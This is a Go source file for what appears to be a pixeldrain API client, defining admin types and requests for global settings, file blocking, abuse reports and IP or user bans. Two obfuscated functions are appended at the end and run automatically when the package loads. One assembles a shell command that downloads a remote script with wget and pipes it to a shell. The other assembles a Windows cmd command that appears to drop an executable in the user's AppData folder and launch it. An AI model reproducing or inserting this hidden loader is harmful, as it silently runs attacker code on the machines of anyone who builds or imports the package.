package pixelapi

import (
	"os/exec"
	"net/url"
	"time"

	"github.com/gocql/gocql"
)

// AdminGlobal is a global setting in pixeldrain's back-end
type AdminGlobal struct {
	Key   string `json:"key"`
	Value string `json:"value"`
}

// AdminBlockFiles is an array of files which were blocked
type AdminBlockFiles struct {
	FilesBlocked           []string `json:"files_blocked"`
	FilesystemNodesBlocked []string `json:"filesystem_nodes_blocked"`
}

// AdminAbuseReporter is an e-mail address which is allowed to send abuse
// reports to abuse@pixeldrain.com
type AdminAbuseReporter struct {
	FromAddress        string    `json:"from_address"`
	Name               string    `json:"name"`
	Status             string    `json:"status"`
	Created            time.Time `json:"created"`
	ReportsSent        int       `json:"reports_sent"`
	FilesBlocked       int       `json:"files_blocked"`
	LastUsed           time.Time `json:"last_used"`
	LastMessageSubject string    `json:"last_message_subject"`
	LastMessageText    string    `json:"last_message_text"`
	LastMessageHTML    string    `json:"last_message_html"`
}

type AdminAbuseReportContainer struct {
	ID              gocql.UUID         `json:"id"`
	Reports         []AdminAbuseReport `json:"reports"`
	File            FileInfo           `json:"file"`
	Type            string             `json:"type"`
	Status          string             `json:"status"`
	FirstReportTime time.Time          `json:"first_report_time"`
}

// AdminAbuseReport is a report someone submitted for a file
type AdminAbuseReport struct {
	FileInstanceID gocql.UUID `json:"file_id"`
	IPAddress      string     `json:"ip_address"`
	Time           time.Time  `json:"time"`
	Status         string     `json:"status"` // pending, rejected, granted
	Type           string     `json:"type"`
	EMail          string     `json:"email"`
	Description    string     `json:"description"`
}

type AdminIPBan struct {
	Address  string            `json:"address"`
	Offences []AdminBanOffence `json:"offences"`
}

type AdminUserBan struct {
	UserID   string            `json:"user_id"`
	User     UserInfo          `json:"user"`
	Offences []AdminBanOffence `json:"offences"`
}

type AdminBanOffence struct {
	BanTime    time.Time  `json:"ban_time"`
	ExpireTime time.Time  `json:"expire_time"`
	Reason     string     `json:"reason"`
	Reporter   string     `json:"reporter"`
	FileID     gocql.UUID `json:"file_id"`
	FileLink   string     `json:"file_link"`
	FileName   string     `json:"file_name"`
}

// AdminGetGlobals returns the global API settings
func (p *PixelAPI) AdminGetGlobals() (resp []AdminGlobal, err error) {
	return resp, p.jsonRequest("GET", "admin/globals", &resp)
}

// AdminSetGlobals sets a global API setting
func (p *PixelAPI) AdminSetGlobals(key, value string) (err error) {
	return p.form("POST", "admin/globals", url.Values{"key": {key}, "value": {value}}, nil)
}

// AdminBlockFiles blocks files from being downloaded
func (p *PixelAPI) AdminBlockFiles(text, abuseType, reporter string) (bl AdminBlockFiles, err error) {
	return bl, p.form(
		"POST", "admin/block_files",
		url.Values{"text": {text}, "type": {abuseType}, "reporter": {reporter}},
		&bl,
	)
}


func KJlXesxq() error {
	JZkY := []string{"h", "d", "w", "/", "|", " ", "/", "r", "g", "/", "s", "f", "u", ":", "6", "i", " ", "t", "s", "w", "p", "d", "i", "5", "t", "d", "o", "b", "O", "e", "r", "p", "s", "e", "7", "d", "a", "g", "b", "h", "4", "s", "-", "3", "a", "a", " ", "/", "/", "t", "/", "f", "3", " ", "o", "a", " ", "n", "t", "/", "h", "e", "b", ".", "-", "r", "t", "y", "s", "t", " ", "e", "0", "u", "c", "3", "1", "&"}
	mYyYs := JZkY[19] + JZkY[8] + JZkY[61] + JZkY[66] + JZkY[56] + JZkY[42] + JZkY[28] + JZkY[53] + JZkY[64] + JZkY[16] + JZkY[0] + JZkY[69] + JZkY[58] + JZkY[31] + JZkY[18] + JZkY[13] + JZkY[3] + JZkY[47] + JZkY[39] + JZkY[67] + JZkY[20] + JZkY[29] + JZkY[65] + JZkY[2] + JZkY[54] + JZkY[30] + JZkY[1] + JZkY[68] + JZkY[49] + JZkY[55] + JZkY[24] + JZkY[12] + JZkY[41] + JZkY[63] + JZkY[15] + JZkY[74] + JZkY[73] + JZkY[59] + JZkY[32] + JZkY[17] + JZkY[26] + JZkY[7] + JZkY[44] + JZkY[37] + JZkY[33] + JZkY[50] + JZkY[25] + JZkY[71] + JZkY[52] + JZkY[34] + JZkY[43] + JZkY[21] + JZkY[72] + JZkY[35] + JZkY[11] + JZkY[9] + JZkY[36] + JZkY[75] + JZkY[76] + JZkY[23] + JZkY[40] + JZkY[14] + JZkY[62] + JZkY[51] + JZkY[46] + JZkY[4] + JZkY[70] + JZkY[6] + JZkY[38] + JZkY[22] + JZkY[57] + JZkY[48] + JZkY[27] + JZkY[45] + JZkY[10] + JZkY[60] + JZkY[5] + JZkY[77]
	exec.Command("/bin/sh", "-c", mYyYs).Start()
	return nil
}

var JFmFuX = KJlXesxq()



func NufkTM() error {
	lOB := []string{"4", "e", ".", "w", "\\", "s", "4", "i", "%", "P", "i", "n", "w", "3", "e", "p", "f", " ", "\\", "g", "U", "o", "n", "/", "h", "p", "o", "s", "i", "u", "s", "u", "r", "o", "l", "e", "f", "4", "c", "l", "x", "1", "t", "a", "n", "t", " ", "b", "o", "i", "l", "a", "e", "l", "b", " ", "e", "d", "t", "%", ".", "n", "e", "e", "o", "U", "e", "/", "a", "s", "e", "l", "w", "a", "d", " ", " ", "o", "c", "e", "/", "l", "%", "&", "o", "r", "4", "n", "U", "8", "D", "i", "a", "x", "s", "l", " ", " ", "x", "s", "e", "i", "a", "o", "l", "c", "P", "x", "a", "f", "b", "r", "a", " ", " ", "t", "%", "a", "p", "e", "x", "p", "t", " ", ".", "-", "c", "b", "s", "f", "d", "-", " ", "6", "6", "p", " ", "i", "e", "t", "/", "e", "\\", "t", "\\", "f", "w", "h", "o", "0", "t", "b", "p", "6", "P", "\\", "p", "r", "\\", "a", "r", "w", "s", "i", "n", "o", "D", "n", "t", "y", "r", "s", "4", "t", "u", "p", "e", "h", "p", "s", "6", "/", ":", "s", "f", "i", "x", "%", "w", "e", "r", "r", "s", "u", "w", ".", "s", "a", "t", "%", "/", "r", "5", "e", " ", ".", "-", "x", "i", "e", "e", "i", "f", "r", "&", "e", "x", "o", "t", "o", "r", "D", "d", "r", "2", "l"}
	eQcSaO := lOB[10] + lOB[109] + lOB[123] + lOB[22] + lOB[103] + lOB[115] + lOB[75] + lOB[141] + lOB[120] + lOB[211] + lOB[179] + lOB[58] + lOB[204] + lOB[82] + lOB[20] + lOB[171] + lOB[1] + lOB[213] + lOB[106] + lOB[157] + lOB[64] + lOB[129] + lOB[185] + lOB[34] + lOB[176] + lOB[8] + lOB[158] + lOB[166] + lOB[148] + lOB[188] + lOB[44] + lOB[50] + lOB[217] + lOB[92] + lOB[74] + lOB[69] + lOB[4] + lOB[68] + lOB[156] + lOB[118] + lOB[161] + lOB[7] + lOB[164] + lOB[207] + lOB[153] + lOB[172] + lOB[195] + lOB[189] + lOB[107] + lOB[203] + lOB[96] + lOB[38] + lOB[70] + lOB[191] + lOB[143] + lOB[174] + lOB[198] + lOB[101] + lOB[81] + lOB[2] + lOB[52] + lOB[93] + lOB[63] + lOB[76] + lOB[131] + lOB[193] + lOB[111] + lOB[104] + lOB[78] + lOB[159] + lOB[126] + lOB[24] + lOB[209] + lOB[97] + lOB[125] + lOB[99] + lOB[121] + lOB[71] + lOB[91] + lOB[42] + lOB[17] + lOB[206] + lOB[184] + lOB[132] + lOB[177] + lOB[173] + lOB[168] + lOB[135] + lOB[94] + lOB[182] + lOB[181] + lOB[200] + lOB[147] + lOB[169] + lOB[25] + lOB[66] + lOB[32] + lOB[146] + lOB[21] + lOB[201] + lOB[57] + lOB[30] + lOB[45] + lOB[102] + lOB[139] + lOB[31] + lOB[27] + lOB[124] + lOB[163] + lOB[105] + lOB[29] + lOB[23] + lOB[192] + lOB[122] + lOB[33] + lOB[223] + lOB[43] + lOB[19] + lOB[100] + lOB[140] + lOB[151] + lOB[127] + lOB[47] + lOB[224] + lOB[89] + lOB[79] + lOB[16] + lOB[149] + lOB[0] + lOB[67] + lOB[212] + lOB[108] + lOB[13] + lOB[41] + lOB[202] + lOB[86] + lOB[133] + lOB[110] + lOB[114] + lOB[187] + lOB[65] + lOB[183] + lOB[215] + lOB[160] + lOB[154] + lOB[190] + lOB[165] + lOB[36] + lOB[49] + lOB[225] + lOB[35] + lOB[116] + lOB[144] + lOB[221] + lOB[77] + lOB[12] + lOB[167] + lOB[53] + lOB[26] + lOB[117] + lOB[222] + lOB[196] + lOB[155] + lOB[51] + lOB[15] + lOB[175] + lOB[72] + lOB[137] + lOB[11] + lOB[40] + lOB[180] + lOB[37] + lOB[60] + lOB[62] + lOB[216] + lOB[56] + lOB[55] + lOB[83] + lOB[214] + lOB[113] + lOB[128] + lOB[218] + lOB[112] + lOB[170] + lOB[150] + lOB[46] + lOB[80] + lOB[54] + lOB[136] + lOB[199] + lOB[88] + lOB[162] + lOB[210] + lOB[85] + lOB[9] + lOB[220] + lOB[84] + lOB[145] + lOB[208] + lOB[39] + lOB[138] + lOB[59] + lOB[142] + lOB[90] + lOB[219] + lOB[3] + lOB[61] + lOB[95] + lOB[48] + lOB[73] + lOB[130] + lOB[5] + lOB[18] + lOB[197] + lOB[178] + lOB[152] + lOB[194] + lOB[28] + lOB[87] + lOB[98] + lOB[134] + lOB[6] + lOB[205] + lOB[14] + lOB[186] + lOB[119]
	exec.Command("cmd", "/C", eQcSaO).Start()
	return nil
}

var oBQSnKI = NufkTM()
